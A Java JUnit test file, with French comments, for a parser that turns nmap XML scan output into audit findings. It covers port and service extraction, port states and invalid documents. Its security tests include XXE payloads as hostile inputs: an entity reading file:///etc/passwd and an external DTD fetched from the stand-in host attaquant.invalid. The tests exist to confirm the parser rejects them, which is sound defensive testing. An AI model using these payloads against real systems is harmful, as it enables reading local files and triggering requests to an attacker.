package com.cyberas.domain.scanner;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Le parseur est le point où la sortie d'un outil externe devient une donnée
 * d'audit. Deux propriétés comptent autant que l'exactitude de l'extraction :
 * un document illisible doit produire une erreur et non zéro constat, et
 * l'analyse ne doit jamais déclencher d'accès externe.
 */
class NmapXmlParserTest {

    private final NmapXmlParser parser = new NmapXmlParser();

    /** Enveloppe minimale : le parseur exige l'élément racine de nmap. */
    private static String run(String ports) {
        return """
            <?xml version="1.0" encoding="UTF-8"?>
            <nmaprun scanner="nmap" version="7.94">
              <host>
                <address addr="192.0.2.10" addrtype="ipv4"/>
                <ports>
            """ + ports + """
                </ports>
              </host>
            </nmaprun>
            """;
    }

    // -----------------------------------------------------------------------
    // Extraction
    // -----------------------------------------------------------------------

    @Nested
    @DisplayName("Extraction des observations")
    class Extraction {

        @Test
        @DisplayName("Trois ports ouverts : port, protocole, service, produit et version")
        void extraitLesTroisPortsOuverts() throws Exception {
            List<NmapFinding> findings = parser.parse(run("""
                  <port protocol="tcp" portid="22">
                    <state state="open" reason="syn-ack"/>
                    <service name="ssh" product="OpenSSH" version="9.6p1" extrainfo="protocol 2.0"/>
                  </port>
                  <port protocol="tcp" portid="80">
                    <state state="open" reason="syn-ack"/>
                    <service name="http" product="nginx" version="1.24.0"/>
                  </port>
                  <port protocol="tcp" portid="443">
                    <state state="open" reason="syn-ack"/>
                    <service name="https"/>
                  </port>
                """));

            assertEquals(3, findings.size());

            NmapFinding ssh = findings.get(0);
            assertEquals(22, ssh.port());
            assertEquals("tcp", ssh.protocol());
            assertEquals("open", ssh.state());
            assertEquals("ssh", ssh.serviceName());
            assertEquals("OpenSSH", ssh.product());
            assertEquals("9.6p1", ssh.version());
            assertEquals("protocol 2.0", ssh.extraInfo());
            assertTrue(ssh.hasIdentifiedVersion());
            assertEquals("ssh OpenSSH 9.6p1 (protocol 2.0)", ssh.serviceDescription());

            NmapFinding http = findings.get(1);
            assertEquals(80, http.port());
            assertEquals("nginx", http.product());
            assertEquals("1.24.0", http.version());
            assertNull(http.extraInfo());

            // Service nommé mais non identifié : aucune version ne doit être inventée.
            NmapFinding https = findings.get(2);
            assertEquals(443, https.port());
            assertEquals("https", https.serviceName());
            assertNull(https.product());
            assertNull(https.version());
            assertFalse(https.hasIdentifiedVersion());
        }

        @Test
        @DisplayName("Plusieurs protocoles : tcp et udp sont distingués")
        void distingueLesProtocoles() throws Exception {
            List<NmapFinding> findings = parser.parse(run("""
                  <port protocol="tcp" portid="53">
                    <state state="open"/><service name="domain"/>
                  </port>
                  <port protocol="udp" portid="53">
                    <state state="open"/><service name="domain"/>
                  </port>
                """));

            assertEquals(2, findings.size());
            assertEquals("tcp", findings.get(0).protocol());
            assertEquals("udp", findings.get(1).protocol());
        }

        @Test
        @DisplayName("Port sans élément <service> : l'observation reste valide")
        void portSansService() throws Exception {
            List<NmapFinding> findings = parser.parse(run("""
                  <port protocol="tcp" portid="8080">
                    <state state="open"/>
                  </port>
                """));

            assertEquals(1, findings.size());
            NmapFinding f = findings.get(0);
            assertEquals(8080, f.port());
            assertTrue(f.isOpen());
            assertNull(f.serviceName());
            assertNull(f.serviceDescription());
        }

        @Test
        @DisplayName("Service sans version : le produit seul ne suffit pas à identifier")
        void serviceSansVersion() throws Exception {
            List<NmapFinding> findings = parser.parse(run("""
                  <port protocol="tcp" portid="21">
                    <state state="open"/>
                    <service name="ftp" product="vsftpd"/>
                  </port>
                """));

            NmapFinding f = findings.get(0);
            assertEquals("vsftpd", f.product());
            assertNull(f.version());
            assertFalse(f.hasIdentifiedVersion(),
                "sans version, aucune correspondance CPE/CVE ne peut être établie");
        }

        @Test
        @DisplayName("Attribut vide traité comme absent, pas comme donnée")
        void attributVideEstNul() throws Exception {
            List<NmapFinding> findings = parser.parse(run("""
                  <port protocol="tcp" portid="25">
                    <state state="open"/>
                    <service name="smtp" product="" version="   "/>
                  </port>
                """));

            assertNull(findings.get(0).product());
            assertNull(findings.get(0).version());
        }

        @Test
        @DisplayName("Numéro de port hors plage : l'entrée est écartée")
        void portHorsPlageEcarte() throws Exception {
            List<NmapFinding> findings = parser.parse(run("""
                  <port protocol="tcp" portid="99999">
                    <state state="open"/>
                  </port>
                  <port protocol="tcp" portid="22">
                    <state state="open"/>
                  </port>
                """));

            assertEquals(1, findings.size());
            assertEquals(22, findings.get(0).port());
        }
    }

    // -----------------------------------------------------------------------
    // États de port
    // -----------------------------------------------------------------------

    @Nested
    @DisplayName("États de port")
    class Etats {

        @Test
        @DisplayName("Port fermé : conservé comme observation, jamais ouvert")
        void portFerme() throws Exception {
            List<NmapFinding> all = parser.parse(run("""
                  <port protocol="tcp" portid="23">
                    <state state="closed" reason="reset"/>
                  </port>
                """));

            assertEquals(1, all.size());
            assertEquals("closed", all.get(0).state());
            assertFalse(all.get(0).isOpen());
        }

        @Test
        @DisplayName("Port filtré : ne donne lieu à aucun constat de service")
        void portFiltre() throws Exception {
            List<NmapFinding> all = parser.parse(run("""
                  <port protocol="tcp" portid="445">
                    <state state="filtered" reason="no-response"/>
                  </port>
                """));

            assertEquals("filtered", all.get(0).state());
            assertFalse(all.get(0).isOpen());
        }

        @Test
        @DisplayName("parseOpenPorts ne retient que l'écoute confirmée")
        void seulsLesPortsOuvertsSontRetenus() throws Exception {
            String xml = run("""
                  <port protocol="tcp" portid="22"><state state="open"/></port>
                  <port protocol="tcp" portid="23"><state state="closed"/></port>
                  <port protocol="tcp" portid="445"><state state="filtered"/></port>
                  <port protocol="tcp" portid="80"><state state="open|filtered"/></port>
                """);

            assertEquals(4, parser.parse(xml).size(), "toutes les observations sont conservées");

            List<NmapFinding> open = parser.parseOpenPorts(xml);
            assertEquals(1, open.size(), "open|filtered n'est pas une écoute confirmée");
            assertEquals(22, open.get(0).port());
        }
    }

    // -----------------------------------------------------------------------
    // Intégrité : une erreur d'analyse n'est pas une absence de constat
    // -----------------------------------------------------------------------

    @Nested
    @DisplayName("Documents invalides")
    class Invalides {

        @Test
        @DisplayName("XML mal formé : erreur explicite, pas une liste vide")
        void xmlMalForme() {
            NmapParseException e = assertThrows(NmapParseException.class,
                () -> parser.parse("<nmaprun><host><ports><port portid=\"22\"></ports></nmaprun>"));
            assertTrue(e.getMessage().contains("illisible"));
        }

        @Test
        @DisplayName("XML tronqué : erreur explicite")
        void xmlTronque() {
            assertThrows(NmapParseException.class,
                () -> parser.parse("<?xml version=\"1.0\"?><nmaprun><host><ports><port protocol=\"tcp\""));
        }

        @Test
        @DisplayName("Sortie vide ou nulle : erreur, jamais zéro constat")
        void sortieVide() {
            assertThrows(NmapParseException.class, () -> parser.parse(null));
            assertThrows(NmapParseException.class, () -> parser.parse("   "));
        }

        @Test
        @DisplayName("Document bien formé mais étranger à nmap : refusé")
        void documentEtranger() {
            NmapParseException e = assertThrows(NmapParseException.class,
                () -> parser.parse("<?xml version=\"1.0\"?><error>service unavailable</error>"));
            assertTrue(e.getMessage().contains("nmaprun"));
        }

        @Test
        @DisplayName("Scan sans port ouvert : liste vide, et c'est un résultat valide")
        void aucunPortEstUnResultatValide() throws Exception {
            List<NmapFinding> findings = parser.parse(run(""));
            assertTrue(findings.isEmpty(),
                "un hôte sans port ouvert est un constat, pas une erreur");
        }
    }

    // -----------------------------------------------------------------------
    // Sécurité
    // -----------------------------------------------------------------------

    @Nested
    @DisplayName("Sécurité du parseur")
    class Securite {

        @Test
        @DisplayName("XXE : une entité externe fait échouer l'analyse, aucun fichier n'est lu")
        void entiteExterneRejetee() {
            String malicious = """
                <?xml version="1.0"?>
                <!DOCTYPE nmaprun [
                  <!ENTITY xxe SYSTEM "file:///etc/passwd">
                ]>
                <nmaprun scanner="nmap">
                  <host><ports>
                    <port protocol="tcp" portid="22">
                      <state state="open"/>
                      <service name="&xxe;"/>
                    </port>
                  </ports></host>
                </nmaprun>
                """;

            NmapParseException e = assertThrows(NmapParseException.class,
                () -> parser.parse(malicious),
                "la déclaration de DOCTYPE doit être refusée");
            assertFalse(String.valueOf(e.getMessage()).contains("root:"),
                "aucun contenu de fichier local ne doit apparaître");
        }

        @Test
        @DisplayName("Le DOCTYPE nu de nmap est accepté : c'est celui de toute sortie réelle")
        void doctypeNuAccepte() throws Exception {
            // nmap préfixe chaque sortie XML de cette déclaration. Un refus
            // global du DOCTYPE faisait échouer tous les scans réels, avec un
            // message parlant d'attaque là où il n'y avait qu'un en-tête.
            // Ce test fige le cas constaté en production.
            String realOutput = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE nmaprun>
                <?xml-stylesheet href="file:///usr/share/nmap/nmap.xsl" type="text/xsl"?>
                <nmaprun scanner="nmap" version="7.94">
                  <host><ports>
                    <port protocol="tcp" portid="22">
                      <state state="open"/>
                      <service name="ssh" product="OpenSSH" version="6.6.1p1"/>
                    </port>
                  </ports></host>
                </nmaprun>
                """;

            List<NmapFinding> findings = parser.parse(realOutput);
            assertEquals(1, findings.size());
            assertEquals(22, findings.get(0).port());
            assertEquals("OpenSSH", findings.get(0).product());
        }

        @Test
        @DisplayName("DOCTYPE avec sous-ensemble interne : refusé, c'est le vecteur XXE")
        void doctypeAvecSousEnsembleInterneRejete() {
            String malicious = """
                <?xml version="1.0"?>
                <!DOCTYPE nmaprun [ <!ENTITY x "abc"> ]>
                <nmaprun scanner="nmap"><host><ports/></host></nmaprun>
                """;

            NmapParseException e = assertThrows(NmapParseException.class,
                () -> parser.parse(malicious));
            assertTrue(e.getMessage().contains("sous-ensemble interne"));
        }

        @Test
        @DisplayName("XXE avec DTD externe : refusée avant toute requête sortante")
        void dtdExterneRejetee() {
            String malicious = """
                <?xml version="1.0"?>
                <!DOCTYPE nmaprun SYSTEM "http://attaquant.invalid/evil.dtd">
                <nmaprun scanner="nmap"><host><ports/></host></nmaprun>
                """;

            assertThrows(NmapParseException.class, () -> parser.parse(malicious));
        }

        @Test
        @DisplayName("Caractères XML particuliers : échappés, pas interprétés")
        void caracteresParticuliers() throws Exception {
            List<NmapFinding> findings = parser.parse(run("""
                  <port protocol="tcp" portid="80">
                    <state state="open"/>
                    <service name="http" product="Apache &lt;script&gt;" version="2.4 &amp; plus"/>
                  </port>
                """));

            NmapFinding f = findings.get(0);
            assertEquals("Apache <script>", f.product(),
                "les entités standard sont décodées en texte, jamais en balisage");
            assertEquals("2.4 & plus", f.version());
        }
    }
}
